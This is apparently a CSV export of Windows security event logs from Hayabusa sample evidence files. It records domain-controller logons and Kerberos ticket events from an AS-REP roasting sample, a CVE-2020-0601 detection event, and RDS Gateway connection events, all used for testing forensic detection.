29,37888,2021-04-29 07:58:22.9205724,4624,LogAlways,Microsoft-Windows-Security-Auditing,Security,608,2324,DC-Server-1.labcorp.local,0,,Successful logon,-\-," (::1)",Target: LABCORP.LOCAL\DC-SERVER-1$,LogonType 3,LogonId: 0xC72AE1,,,,-,False,/evidence/windows-evtx-hayabusa-samples/CredentialAccess/T1558.004_StealOrForgeKerberosTicketsAS-REP-Roasting_Security.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""SubjectUserSid"",""#text"":""S-1-0-0""},{""@Name"":""SubjectUserName"",""#text"":""-""},{""@Name"":""SubjectDomainName"",""#text"":""-""},{""@Name"":""SubjectLogonId"",""#text"":""0x0""},{""@Name"":""TargetUserSid"",""#text"":""S-1-5-18""},{""@Name"":""TargetUserName"",""#text"":""DC-SERVER-1$""},{""@Name"":""TargetDomainName"",""#text"":""LABCORP.LOCAL""},{""@Name"":""TargetLogonId"",""#text"":""0xC72AE1""},{""@Name"":""LogonType"",""#text"":""3""},{""@Name"":""LogonProcessName"",""#text"":""Kerberos""},{""@Name"":""AuthenticationPackageName"",""#text"":""Kerberos""},{""@Name"":""WorkstationName""},{""@Name"":""LogonGuid"",""#text"":""58839562-92e0-e8d6-3d3c-c1aeed5c31f6""},{""@Name"":""TransmittedServices"",""#text"":""-""},{""@Name"":""LmPackageName"",""#text"":""-""},{""@Name"":""KeyLength"",""#text"":""0""},{""@Name"":""ProcessId"",""#text"":""0x0""},{""@Name"":""ProcessName"",""#text"":""-""},{""@Name"":""IpAddress"",""#text"":""::1""},{""@Name"":""IpPort"",""#text"":""54378""},{""@Name"":""ImpersonationLevel"",""#text"":""%%1833""},{""@Name"":""RestrictedAdminMode"",""#text"":""-""},{""@Name"":""TargetOutboundUserName"",""#text"":""-""},{""@Name"":""TargetOutboundDomainName"",""#text"":""-""},{""@Name"":""VirtualAccount"",""#text"":""%%1843""},{""@Name"":""TargetLinkedLogonId"",""#text"":""0x0""},{""@Name"":""ElevatedToken"",""#text"":""%%1842""}]}}"
30,37889,2021-04-29 07:58:22.9254572,4634,LogAlways,Microsoft-Windows-Security-Auditing,Security,608,2240,DC-Server-1.labcorp.local,0,,An account was logged off,,,Target: LABCORP\DC-SERVER-1$,LogonType 3,LogonId: 0xC72AE1,,,,,False,/evidence/windows-evtx-hayabusa-samples/CredentialAccess/T1558.004_StealOrForgeKerberosTicketsAS-REP-Roasting_Security.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""TargetUserSid"",""#text"":""S-1-5-18""},{""@Name"":""TargetUserName"",""#text"":""DC-SERVER-1$""},{""@Name"":""TargetDomainName"",""#text"":""LABCORP""},{""@Name"":""TargetLogonId"",""#text"":""0xC72AE1""},{""@Name"":""LogonType"",""#text"":""3""}]}}"
31,37890,2021-04-29 07:58:28.4229078,4769,LogAlways,Microsoft-Windows-Security-Auditing,Security,608,2240,DC-Server-1.labcorp.local,0,,A Kerberos service ticket was requested,,::1:0,Target: LABCORP.LOCAL\DC-SERVER-1$@LABCORP.LOCAL,ServiceName: DC-SERVER-1$,ServiceSid: S-1-5-21-2662618741-3450174888-1698379039-1000,TicketEncryptionType: AES256-CTS-HMAC-SHA1-96,Status: KDC_ERR_NONE - No error - No errors were found.,,,False,/evidence/windows-evtx-hayabusa-samples/CredentialAccess/T1558.004_StealOrForgeKerberosTicketsAS-REP-Roasting_Security.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""TargetUserName"",""#text"":""DC-SERVER-1$@LABCORP.LOCAL""},{""@Name"":""TargetDomainName"",""#text"":""LABCORP.LOCAL""},{""@Name"":""ServiceName"",""#text"":""DC-SERVER-1$""},{""@Name"":""ServiceSid"",""#text"":""S-1-5-21-2662618741-3450174888-1698379039-1000""},{""@Name"":""TicketOptions"",""#text"":""0x40810000""},{""@Name"":""TicketEncryptionType"",""#text"":""0x12""},{""@Name"":""IpAddress"",""#text"":""::1""},{""@Name"":""IpPort"",""#text"":""0""},{""@Name"":""Status"",""#text"":""0x0""},{""@Name"":""LogonGuid"",""#text"":""46745809-bf31-91f6-df7c-4b0759421d42""},{""@Name"":""TransmittedServices"",""#text"":""-""}]}}"
32,37891,2021-04-29 07:58:28.4249645,4672,LogAlways,Microsoft-Windows-Security-Auditing,Security,608,2240,DC-Server-1.labcorp.local,0,,Administrative logon,LABCORP\DC-SERVER-1$ (S-1-5-18),,"PrivilegeList: SeSecurityPrivilege, SeBackupPrivilege, SeRestorePrivilege, SeTakeOwnershipPrivilege, SeDebugPrivilege, SeSystemEnvironmentPrivilege, SeLoadDriverPrivilege, SeImpersonatePrivilege, SeDelegateSessionUserImpersonatePrivilege, SeEnableDelegationPrivilege",LogonId: 0xC7313F,,,,,,False,/evidence/windows-evtx-hayabusa-samples/CredentialAccess/T1558.004_StealOrForgeKerberosTicketsAS-REP-Roasting_Security.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""SubjectUserSid"",""#text"":""S-1-5-18""},{""@Name"":""SubjectUserName"",""#text"":""DC-SERVER-1$""},{""@Name"":""SubjectDomainName"",""#text"":""LABCORP""},{""@Name"":""SubjectLogonId"",""#text"":""0xC7313F""},{""@Name"":""PrivilegeList"",""#text"":""SeSecurityPrivilege, SeBackupPrivilege, SeRestorePrivilege, SeTakeOwnershipPrivilege, SeDebugPrivilege, SeSystemEnvironmentPrivilege, SeLoadDriverPrivilege, SeImpersonatePrivilege, SeDelegateSessionUserImpersonatePrivilege, SeEnableDelegationPrivilege""}]}}"
33,37892,2021-04-29 07:58:28.4254456,4624,LogAlways,Microsoft-Windows-Security-Auditing,Security,608,2240,DC-Server-1.labcorp.local,0,,Successful logon,-\-," (fe80::e50e:b89e:4718:3aa)",Target: LABCORP.LOCAL\DC-SERVER-1$,LogonType 3,LogonId: 0xC7313F,,,,-,False,/evidence/windows-evtx-hayabusa-samples/CredentialAccess/T1558.004_StealOrForgeKerberosTicketsAS-REP-Roasting_Security.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""SubjectUserSid"",""#text"":""S-1-0-0""},{""@Name"":""SubjectUserName"",""#text"":""-""},{""@Name"":""SubjectDomainName"",""#text"":""-""},{""@Name"":""SubjectLogonId"",""#text"":""0x0""},{""@Name"":""TargetUserSid"",""#text"":""S-1-5-18""},{""@Name"":""TargetUserName"",""#text"":""DC-SERVER-1$""},{""@Name"":""TargetDomainName"",""#text"":""LABCORP.LOCAL""},{""@Name"":""TargetLogonId"",""#text"":""0xC7313F""},{""@Name"":""LogonType"",""#text"":""3""},{""@Name"":""LogonProcessName"",""#text"":""Kerberos""},{""@Name"":""AuthenticationPackageName"",""#text"":""Kerberos""},{""@Name"":""WorkstationName""},{""@Name"":""LogonGuid"",""#text"":""df7dfc5d-85be-545b-0d4a-1088fde0a2af""},{""@Name"":""TransmittedServices"",""#text"":""-""},{""@Name"":""LmPackageName"",""#text"":""-""},{""@Name"":""KeyLength"",""#text"":""0""},{""@Name"":""ProcessId"",""#text"":""0x0""},{""@Name"":""ProcessName"",""#text"":""-""},{""@Name"":""IpAddress"",""#text"":""fe80::e50e:b89e:4718:3aa""},{""@Name"":""IpPort"",""#text"":""54379""},{""@Name"":""ImpersonationLevel"",""#text"":""%%1840""},{""@Name"":""RestrictedAdminMode"",""#text"":""-""},{""@Name"":""TargetOutboundUserName"",""#text"":""-""},{""@Name"":""TargetOutboundDomainName"",""#text"":""-""},{""@Name"":""VirtualAccount"",""#text"":""%%1843""},{""@Name"":""TargetLinkedLogonId"",""#text"":""0x0""},{""@Name"":""ElevatedToken"",""#text"":""%%1842""}]}}"
34,37893,2021-04-29 07:58:39.1458177,4634,LogAlways,Microsoft-Windows-Security-Auditing,Security,608,2240,DC-Server-1.labcorp.local,0,,An account was logged off,,,Target: LABCORP\DC-SERVER-1$,LogonType 3,LogonId: 0xC7313F,,,,,False,/evidence/windows-evtx-hayabusa-samples/CredentialAccess/T1558.004_StealOrForgeKerberosTicketsAS-REP-Roasting_Security.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""TargetUserSid"",""#text"":""S-1-5-18""},{""@Name"":""TargetUserName"",""#text"":""DC-SERVER-1$""},{""@Name"":""TargetDomainName"",""#text"":""LABCORP""},{""@Name"":""TargetLogonId"",""#text"":""0xC7313F""},{""@Name"":""LogonType"",""#text"":""3""}]}}"
35,37894,2021-04-29 07:59:22.9287973,4672,LogAlways,Microsoft-Windows-Security-Auditing,Security,608,2324,DC-Server-1.labcorp.local,0,,Administrative logon,LABCORP\DC-SERVER-1$ (S-1-5-18),,"PrivilegeList: SeSecurityPrivilege, SeBackupPrivilege, SeRestorePrivilege, SeTakeOwnershipPrivilege, SeDebugPrivilege, SeSystemEnvironmentPrivilege, SeLoadDriverPrivilege, SeImpersonatePrivilege, SeDelegateSessionUserImpersonatePrivilege, SeEnableDelegationPrivilege",LogonId: 0xC74E3E,,,,,,False,/evidence/windows-evtx-hayabusa-samples/CredentialAccess/T1558.004_StealOrForgeKerberosTicketsAS-REP-Roasting_Security.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""SubjectUserSid"",""#text"":""S-1-5-18""},{""@Name"":""SubjectUserName"",""#text"":""DC-SERVER-1$""},{""@Name"":""SubjectDomainName"",""#text"":""LABCORP""},{""@Name"":""SubjectLogonId"",""#text"":""0xC74E3E""},{""@Name"":""PrivilegeList"",""#text"":""SeSecurityPrivilege, SeBackupPrivilege, SeRestorePrivilege, SeTakeOwnershipPrivilege, SeDebugPrivilege, SeSystemEnvironmentPrivilege, SeLoadDriverPrivilege, SeImpersonatePrivilege, SeDelegateSessionUserImpersonatePrivilege, SeEnableDelegationPrivilege""}]}}"
36,37895,2021-04-29 07:59:22.9289808,4624,LogAlways,Microsoft-Windows-Security-Auditing,Security,608,2324,DC-Server-1.labcorp.local,0,,Successful logon,-\-," (::1)",Target: LABCORP.LOCAL\DC-SERVER-1$,LogonType 3,LogonId: 0xC74E3E,,,,-,False,/evidence/windows-evtx-hayabusa-samples/CredentialAccess/T1558.004_StealOrForgeKerberosTicketsAS-REP-Roasting_Security.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""SubjectUserSid"",""#text"":""S-1-0-0""},{""@Name"":""SubjectUserName"",""#text"":""-""},{""@Name"":""SubjectDomainName"",""#text"":""-""},{""@Name"":""SubjectLogonId"",""#text"":""0x0""},{""@Name"":""TargetUserSid"",""#text"":""S-1-5-18""},{""@Name"":""TargetUserName"",""#text"":""DC-SERVER-1$""},{""@Name"":""TargetDomainName"",""#text"":""LABCORP.LOCAL""},{""@Name"":""TargetLogonId"",""#text"":""0xC74E3E""},{""@Name"":""LogonType"",""#text"":""3""},{""@Name"":""LogonProcessName"",""#text"":""Kerberos""},{""@Name"":""AuthenticationPackageName"",""#text"":""Kerberos""},{""@Name"":""WorkstationName""},{""@Name"":""LogonGuid"",""#text"":""58839562-92e0-e8d6-3d3c-c1aeed5c31f6""},{""@Name"":""TransmittedServices"",""#text"":""-""},{""@Name"":""LmPackageName"",""#text"":""-""},{""@Name"":""KeyLength"",""#text"":""0""},{""@Name"":""ProcessId"",""#text"":""0x0""},{""@Name"":""ProcessName"",""#text"":""-""},{""@Name"":""IpAddress"",""#text"":""::1""},{""@Name"":""IpPort"",""#text"":""54383""},{""@Name"":""ImpersonationLevel"",""#text"":""%%1833""},{""@Name"":""RestrictedAdminMode"",""#text"":""-""},{""@Name"":""TargetOutboundUserName"",""#text"":""-""},{""@Name"":""TargetOutboundDomainName"",""#text"":""-""},{""@Name"":""VirtualAccount"",""#text"":""%%1843""},{""@Name"":""TargetLinkedLogonId"",""#text"":""0x0""},{""@Name"":""ElevatedToken"",""#text"":""%%1842""}]}}"
37,37896,2021-04-29 07:59:22.9306293,4634,LogAlways,Microsoft-Windows-Security-Auditing,Security,608,2240,DC-Server-1.labcorp.local,0,,An account was logged off,,,Target: LABCORP\DC-SERVER-1$,LogonType 3,LogonId: 0xC74E3E,,,,,False,/evidence/windows-evtx-hayabusa-samples/CredentialAccess/T1558.004_StealOrForgeKerberosTicketsAS-REP-Roasting_Security.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""TargetUserSid"",""#text"":""S-1-5-18""},{""@Name"":""TargetUserName"",""#text"":""DC-SERVER-1$""},{""@Name"":""TargetDomainName"",""#text"":""LABCORP""},{""@Name"":""TargetLogonId"",""#text"":""0xC74E3E""},{""@Name"":""LogonType"",""#text"":""3""}]}}"
38,37897,2021-04-29 07:59:42.5374209,4672,LogAlways,Microsoft-Windows-Security-Auditing,Security,608,1596,DC-Server-1.labcorp.local,0,,Administrative logon,LABCORP\DC-SERVER-1$ (S-1-5-18),,"PrivilegeList: SeSecurityPrivilege, SeBackupPrivilege, SeRestorePrivilege, SeTakeOwnershipPrivilege, SeDebugPrivilege, SeSystemEnvironmentPrivilege, SeLoadDriverPrivilege, SeImpersonatePrivilege, SeDelegateSessionUserImpersonatePrivilege, SeEnableDelegationPrivilege",LogonId: 0xC7ADB8,,,,,,False,/evidence/windows-evtx-hayabusa-samples/CredentialAccess/T1558.004_StealOrForgeKerberosTicketsAS-REP-Roasting_Security.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""SubjectUserSid"",""#text"":""S-1-5-18""},{""@Name"":""SubjectUserName"",""#text"":""DC-SERVER-1$""},{""@Name"":""SubjectDomainName"",""#text"":""LABCORP""},{""@Name"":""SubjectLogonId"",""#text"":""0xC7ADB8""},{""@Name"":""PrivilegeList"",""#text"":""SeSecurityPrivilege, SeBackupPrivilege, SeRestorePrivilege, SeTakeOwnershipPrivilege, SeDebugPrivilege, SeSystemEnvironmentPrivilege, SeLoadDriverPrivilege, SeImpersonatePrivilege, SeDelegateSessionUserImpersonatePrivilege, SeEnableDelegationPrivilege""}]}}"
39,37898,2021-04-29 07:59:42.5375236,4624,LogAlways,Microsoft-Windows-Security-Auditing,Security,608,1596,DC-Server-1.labcorp.local,0,,Successful logon,-\-," (fe80::e50e:b89e:4718:3aa)",Target: LABCORP.LOCAL\DC-SERVER-1$,LogonType 3,LogonId: 0xC7ADB8,,,,-,False,/evidence/windows-evtx-hayabusa-samples/CredentialAccess/T1558.004_StealOrForgeKerberosTicketsAS-REP-Roasting_Security.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""SubjectUserSid"",""#text"":""S-1-0-0""},{""@Name"":""SubjectUserName"",""#text"":""-""},{""@Name"":""SubjectDomainName"",""#text"":""-""},{""@Name"":""SubjectLogonId"",""#text"":""0x0""},{""@Name"":""TargetUserSid"",""#text"":""S-1-5-18""},{""@Name"":""TargetUserName"",""#text"":""DC-SERVER-1$""},{""@Name"":""TargetDomainName"",""#text"":""LABCORP.LOCAL""},{""@Name"":""TargetLogonId"",""#text"":""0xC7ADB8""},{""@Name"":""LogonType"",""#text"":""3""},{""@Name"":""LogonProcessName"",""#text"":""Kerberos""},{""@Name"":""AuthenticationPackageName"",""#text"":""Kerberos""},{""@Name"":""WorkstationName""},{""@Name"":""LogonGuid"",""#text"":""58839562-92e0-e8d6-3d3c-c1aeed5c31f6""},{""@Name"":""TransmittedServices"",""#text"":""-""},{""@Name"":""LmPackageName"",""#text"":""-""},{""@Name"":""KeyLength"",""#text"":""0""},{""@Name"":""ProcessId"",""#text"":""0x0""},{""@Name"":""ProcessName"",""#text"":""-""},{""@Name"":""IpAddress"",""#text"":""fe80::e50e:b89e:4718:3aa""},{""@Name"":""IpPort"",""#text"":""54388""},{""@Name"":""ImpersonationLevel"",""#text"":""%%1833""},{""@Name"":""RestrictedAdminMode"",""#text"":""-""},{""@Name"":""TargetOutboundUserName"",""#text"":""-""},{""@Name"":""TargetOutboundDomainName"",""#text"":""-""},{""@Name"":""VirtualAccount"",""#text"":""%%1843""},{""@Name"":""TargetLinkedLogonId"",""#text"":""0x0""},{""@Name"":""ElevatedToken"",""#text"":""%%1842""}]}}"
40,37899,2021-04-29 07:59:42.5429276,4634,LogAlways,Microsoft-Windows-Security-Auditing,Security,608,2240,DC-Server-1.labcorp.local,0,,An account was logged off,,,Target: LABCORP\DC-SERVER-1$,LogonType 3,LogonId: 0xC7ADB8,,,,,False,/evidence/windows-evtx-hayabusa-samples/CredentialAccess/T1558.004_StealOrForgeKerberosTicketsAS-REP-Roasting_Security.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""TargetUserSid"",""#text"":""S-1-5-18""},{""@Name"":""TargetUserName"",""#text"":""DC-SERVER-1$""},{""@Name"":""TargetDomainName"",""#text"":""LABCORP""},{""@Name"":""TargetLogonId"",""#text"":""0xC7ADB8""},{""@Name"":""LogonType"",""#text"":""3""}]}}"
41,37900,2021-04-29 07:59:42.5451096,4672,LogAlways,Microsoft-Windows-Security-Auditing,Security,608,1596,DC-Server-1.labcorp.local,0,,Administrative logon,LABCORP\DC-SERVER-1$ (S-1-5-18),,"PrivilegeList: SeSecurityPrivilege, SeBackupPrivilege, SeRestorePrivilege, SeTakeOwnershipPrivilege, SeDebugPrivilege, SeSystemEnvironmentPrivilege, SeLoadDriverPrivilege, SeImpersonatePrivilege, SeDelegateSessionUserImpersonatePrivilege, SeEnableDelegationPrivilege",LogonId: 0xC7AE25,,,,,,False,/evidence/windows-evtx-hayabusa-samples/CredentialAccess/T1558.004_StealOrForgeKerberosTicketsAS-REP-Roasting_Security.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""SubjectUserSid"",""#text"":""S-1-5-18""},{""@Name"":""SubjectUserName"",""#text"":""DC-SERVER-1$""},{""@Name"":""SubjectDomainName"",""#text"":""LABCORP""},{""@Name"":""SubjectLogonId"",""#text"":""0xC7AE25""},{""@Name"":""PrivilegeList"",""#text"":""SeSecurityPrivilege, SeBackupPrivilege, SeRestorePrivilege, SeTakeOwnershipPrivilege, SeDebugPrivilege, SeSystemEnvironmentPrivilege, SeLoadDriverPrivilege, SeImpersonatePrivilege, SeDelegateSessionUserImpersonatePrivilege, SeEnableDelegationPrivilege""}]}}"
42,37901,2021-04-29 07:59:42.5452184,4624,LogAlways,Microsoft-Windows-Security-Auditing,Security,608,1596,DC-Server-1.labcorp.local,0,,Successful logon,-\-," (fe80::e50e:b89e:4718:3aa)",Target: LABCORP.LOCAL\DC-SERVER-1$,LogonType 3,LogonId: 0xC7AE25,,,,-,False,/evidence/windows-evtx-hayabusa-samples/CredentialAccess/T1558.004_StealOrForgeKerberosTicketsAS-REP-Roasting_Security.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""SubjectUserSid"",""#text"":""S-1-0-0""},{""@Name"":""SubjectUserName"",""#text"":""-""},{""@Name"":""SubjectDomainName"",""#text"":""-""},{""@Name"":""SubjectLogonId"",""#text"":""0x0""},{""@Name"":""TargetUserSid"",""#text"":""S-1-5-18""},{""@Name"":""TargetUserName"",""#text"":""DC-SERVER-1$""},{""@Name"":""TargetDomainName"",""#text"":""LABCORP.LOCAL""},{""@Name"":""TargetLogonId"",""#text"":""0xC7AE25""},{""@Name"":""LogonType"",""#text"":""3""},{""@Name"":""LogonProcessName"",""#text"":""Kerberos""},{""@Name"":""AuthenticationPackageName"",""#text"":""Kerberos""},{""@Name"":""WorkstationName""},{""@Name"":""LogonGuid"",""#text"":""58839562-92e0-e8d6-3d3c-c1aeed5c31f6""},{""@Name"":""TransmittedServices"",""#text"":""-""},{""@Name"":""LmPackageName"",""#text"":""-""},{""@Name"":""KeyLength"",""#text"":""0""},{""@Name"":""ProcessId"",""#text"":""0x0""},{""@Name"":""ProcessName"",""#text"":""-""},{""@Name"":""IpAddress"",""#text"":""fe80::e50e:b89e:4718:3aa""},{""@Name"":""IpPort"",""#text"":""54389""},{""@Name"":""ImpersonationLevel"",""#text"":""%%1833""},{""@Name"":""RestrictedAdminMode"",""#text"":""-""},{""@Name"":""TargetOutboundUserName"",""#text"":""-""},{""@Name"":""TargetOutboundDomainName"",""#text"":""-""},{""@Name"":""VirtualAccount"",""#text"":""%%1843""},{""@Name"":""TargetLinkedLogonId"",""#text"":""0x0""},{""@Name"":""ElevatedToken"",""#text"":""%%1842""}]}}"
43,37902,2021-04-29 07:59:42.5525325,4634,LogAlways,Microsoft-Windows-Security-Auditing,Security,608,2740,DC-Server-1.labcorp.local,0,,An account was logged off,,,Target: LABCORP\DC-SERVER-1$,LogonType 3,LogonId: 0xC7AE25,,,,,False,/evidence/windows-evtx-hayabusa-samples/CredentialAccess/T1558.004_StealOrForgeKerberosTicketsAS-REP-Roasting_Security.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""TargetUserSid"",""#text"":""S-1-5-18""},{""@Name"":""TargetUserName"",""#text"":""DC-SERVER-1$""},{""@Name"":""TargetDomainName"",""#text"":""LABCORP""},{""@Name"":""TargetLogonId"",""#text"":""0xC7AE25""},{""@Name"":""LogonType"",""#text"":""3""}]}}"
1,19156,2020-01-18 18:14:29.8318684,1,Warning,Microsoft-Windows-Audit-CVE,Application,23004,22388,Isaac,0,S-1-5-21-955638165-4017457581-270078328-1001,An attempt to exploit a known vulnerability detected,,,[CVE-2020-0601] cert validation,CA: &lt;USERTrust ECC Certification Authority&gt; sha1: C01B8463C8619676BA102EEBF0C30CDCED9A942B para: 06052B81040022 otherPara: 30820157020101303C06072A8648CE3D0101023100FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEFFFFFFFF0000000000000000FFFFFFFF307B0430FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEFFFFFFFF0000000000000000FFFFFFFC0430B3312FA7E23EE7E4988E056BE3F82D19181D9C6EFE8141120314088F5013875AC656398D8A2ED19D2A85C8EDD3EC2AEF031500A335926AA319A27A1D00896A6773A4827ACDAC73046104D6EB7932E25502AE5151A3609384C13041904BE25B912B77FE4333C0B1486FB0CD815522FF79F8E85A9045E8DFDA490E706BD2FC38276D0A998962A1DFA1E0361AE82AEFC24BDECD9BD856CDC2FDADB54DEEFF6ACDFC0B2BF5ABEBB21C5705D4023100FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFC7634D81F4372DDF581A0DB248B0A77AECEC196ACCC52973020101,,,,,,False,/evidence/windows-evtx-hayabusa-samples/Vulnerabilities/App_1_CVE-Detected.evtx,Classic,0,"{""EventData"":{""Data"":[{""@Name"":""CVEID"",""#text"":""[CVE-2020-0601] cert validation""},{""@Name"":""AdditionalDetails"",""#text"":""CA: &lt;USERTrust ECC Certification Authority&gt; sha1: C01B8463C8619676BA102EEBF0C30CDCED9A942B para: 06052B81040022 otherPara: 30820157020101303C06072A8648CE3D0101023100FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEFFFFFFFF0000000000000000FFFFFFFF307B0430FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEFFFFFFFF0000000000000000FFFFFFFC0430B3312FA7E23EE7E4988E056BE3F82D19181D9C6EFE8141120314088F5013875AC656398D8A2ED19D2A85C8EDD3EC2AEF031500A335926AA319A27A1D00896A6773A4827ACDAC73046104D6EB7932E25502AE5151A3609384C13041904BE25B912B77FE4333C0B1486FB0CD815522FF79F8E85A9045E8DFDA490E706BD2FC38276D0A998962A1DFA1E0361AE82AEFC24BDECD9BD856CDC2FDADB54DEEFF6ACDFC0B2BF5ABEBB21C5705D4023100FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFC7634D81F4372DDF581A0DB248B0A77AECEC196ACCC52973020101""}]}}"
74,74,2024-11-04 13:55:34.6579658,303,Info,Microsoft-Windows-TerminalServices-Gateway,Microsoft-Windows-TerminalServices-Gateway/Operational,1444,2256,EC2AMAZ-6C3C9U6,0,S-1-5-20,Remote Desktop Services: User disconnected from resource,EC2AMAZ-6C3C9U6\Administrator,,EC2AMAZ-6C3C9U6\Administrator on client computer 219.100.37.243 disconnected from ec2-18-179-8-103.ap-northeast-1.compute.amazonaws.com,"Before EC2AMAZ-6C3C9U6\Administrator disconnected, the client transferred 678033 bytes and received 810679 bytes",The client session duration was 122 seconds,ErrorCode: 1226,ConnectionProtocol: HTTP,"AuthType: ",,False,/evidence/windows-evtx-hayabusa-samples/IntialAccess/ValidAccounts/ID302 RDS Gateway Logon Logoff.evtx,0x4000000001000000,0,"{""UserData"":{""EventInfo"":{""Username"":""EC2AMAZ-6C3C9U6\\Administrator"",""IpAddress"":""219.100.37.243"",""AuthType"":"""",""Resource"":""ec2-18-179-8-103.ap-northeast-1.compute.amazonaws.com"",""BytesReceived"":""810679"",""BytesTransfered"":""678033"",""SessionDuration"":""122"",""ConnectionProtocol"":""HTTP"",""ErrorCode"":""1226""}}}"
75,75,2024-11-04 13:58:08.6464861,312,LogAlways,Microsoft-Windows-TerminalServices-Gateway,Microsoft-Windows-TerminalServices-Gateway/Operational,1444,2984,EC2AMAZ-6C3C9U6,0,S-1-5-20,Remote Desktop Services: User has initiated an outbound connection,Administrator,,Administrator on client computer 219.100.37.243:63913 has initiated an outbound connection that has yet to be authenticated,,,,,,,False,/evidence/windows-evtx-hayabusa-samples/IntialAccess/ValidAccounts/ID302 RDS Gateway Logon Logoff.evtx,0x4000000000000000,0,"{""UserData"":{""EventInfo"":{""Username"":""Administrator"",""IpAddress"":""219.100.37.243:63913""}}}"
76,76,2024-11-04 13:58:09.2054417,312,LogAlways,Microsoft-Windows-TerminalServices-Gateway,Microsoft-Windows-TerminalServices-Gateway/Operational,1444,2984,EC2AMAZ-6C3C9U6,0,S-1-5-20,Remote Desktop Services: User has initiated an outbound connection,Administrator,,Administrator on client computer 219.100.37.243:63913 has initiated an outbound connection that has yet to be authenticated,,,,,,,False,/evidence/windows-evtx-hayabusa-samples/IntialAccess/ValidAccounts/ID302 RDS Gateway Logon Logoff.evtx,0x4000000000000000,0,"{""UserData"":{""EventInfo"":{""Username"":""Administrator"",""IpAddress"":""219.100.37.243:63913""}}}"
77,77,2024-11-04 13:58:14.2410561,312,LogAlways,Microsoft-Windows-TerminalServices-Gateway,Microsoft-Windows-TerminalServices-Gateway/Operational,1444,2984,EC2AMAZ-6C3C9U6,0,S-1-5-20,Remote Desktop Services: User has initiated an outbound connection,Administrator,,Administrator on client computer 219.100.37.243:63914 has initiated an outbound connection that has yet to be authenticated,,,,,,,False,/evidence/windows-evtx-hayabusa-samples/IntialAccess/ValidAccounts/ID302 RDS Gateway Logon Logoff.evtx,0x4000000000000000,0,"{""UserData"":{""EventInfo"":{""Username"":""Administrator"",""IpAddress"":""219.100.37.243:63914""}}}"
78,78,2024-11-04 13:58:14.4809723,312,LogAlways,Microsoft-Windows-TerminalServices-Gateway,Microsoft-Windows-TerminalServices-Gateway/Operational,1444,2984,EC2AMAZ-6C3C9U6,0,S-1-5-20,Remote Desktop Services: User has initiated an outbound connection,Administrator,,Administrator on client computer 219.100.37.243:63914 has initiated an outbound connection that has yet to be authenticated,,,,,,,False,/evidence/windows-evtx-hayabusa-samples/IntialAccess/ValidAccounts/ID302 RDS Gateway Logon Logoff.evtx,0x4000000000000000,0,"{""UserData"":{""EventInfo"":{""Username"":""Administrator"",""IpAddress"":""219.100.37.243:63914""}}}"
79,79,2024-11-04 13:58:27.8827187,312,LogAlways,Microsoft-Windows-TerminalServices-Gateway,Microsoft-Windows-TerminalServices-Gateway/Operational,1444,2984,EC2AMAZ-6C3C9U6,0,S-1-5-20,Remote Desktop Services: User has initiated an outbound connection,Administrator,,Administrator on client computer 219.100.37.243:63915 has initiated an outbound connection that has yet to be authenticated,,,,,,,False,/evidence/windows-evtx-hayabusa-samples/IntialAccess/ValidAccounts/ID302 RDS Gateway Logon Logoff.evtx,0x4000000000000000,0,"{""UserData"":{""EventInfo"":{""Username"":""Administrator"",""IpAddress"":""219.100.37.243:63915""}}}"
80,80,2024-11-04 13:58:27.9212444,312,LogAlways,Microsoft-Windows-TerminalServices-Gateway,Microsoft-Windows-TerminalServices-Gateway/Operational,1444,2452,EC2AMAZ-6C3C9U6,0,S-1-5-20,Remote Desktop Services: User has initiated an outbound connection,Administrator,,Administrator on client computer 219.100.37.243:63915 has initiated an outbound connection that has yet to be authenticated,,,,,,,False,/evidence/windows-evtx-hayabusa-samples/IntialAccess/ValidAccounts/ID302 RDS Gateway Logon Logoff.evtx,0x4000000000000000,0,"{""UserData"":{""EventInfo"":{""Username"":""Administrator"",""IpAddress"":""219.100.37.243:63915""}}}"
81,81,2024-11-04 13:58:27.9786474,200,Info,Microsoft-Windows-TerminalServices-Gateway,Microsoft-Windows-TerminalServices-Gateway/Operational,1444,2984,EC2AMAZ-6C3C9U6,0,S-1-5-20,Remote Desktop Services: User meets resource authorization policy requirements needed to connect to TS Gateway server,EC2AMAZ-6C3C9U6\Administrator,,EC2AMAZ-6C3C9U6\Administrator on client computer 219.100.37.243 met resource authorization policy requirements and was therefore authorized to access the TS Gateway server,,,ErrorCode: 0,ConnectionProtocol: HTTP,AuthType: NTLM,,False,/evidence/windows-evtx-hayabusa-samples/IntialAccess/ValidAccounts/ID302 RDS Gateway Logon Logoff.evtx,0x4020000001000000,0,"{""UserData"":{""EventInfo"":{""Username"":""EC2AMAZ-6C3C9U6\\Administrator"",""IpAddress"":""219.100.37.243"",""AuthType"":""NTLM"",""Resource"":"""",""ConnectionProtocol"":""HTTP"",""ErrorCode"":""0""}}}"
